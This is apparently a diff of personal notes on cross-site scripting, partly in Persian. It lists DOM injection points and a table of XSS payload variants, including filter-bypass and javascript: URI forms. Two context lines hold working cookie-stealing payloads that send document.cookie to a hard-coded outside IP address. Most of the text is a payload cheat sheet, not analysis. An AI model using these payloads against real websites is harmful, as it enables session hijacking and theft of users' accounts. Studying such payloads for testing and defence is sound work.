@@ -3,3 +3,24 @@
 <script>fetch('http://153.120.168.59/log?c='+document.cookie+'&pass=12345')</script>
 <img src="http://153.120.168.59:8080/log?c="+document.cookie+"&pass=12345">
 
+
+
+. فهم ساختار DOM و جاهای قابل تزریق (Injection points)
+
+مثل:
+
+    <div>[HERE]</div>
+
+    <img src='[HERE]'>
+
+    <script>[HERE]</script>
+
+
+| نوع            | مثال                                                      |
+| -------------- | --------------------------------------------------------- |
+| Basic          | `<script>alert(1)</script>`                               |
+| HTML injection | `<img src=x onerror=alert(1)>`                            |
+| Event handler  | `<svg onload=alert(1)>`                                   |
+| Unicode bypass | `<scr<script>ipt>alert(1)</scr</script>ipt>`              |
+| Data URI       | `<iframe src="data:text/html,<script>alert(1)</script>">` |
+| JS protocol    | `<a href="javascript:alert(1)">Click</a>`                 |
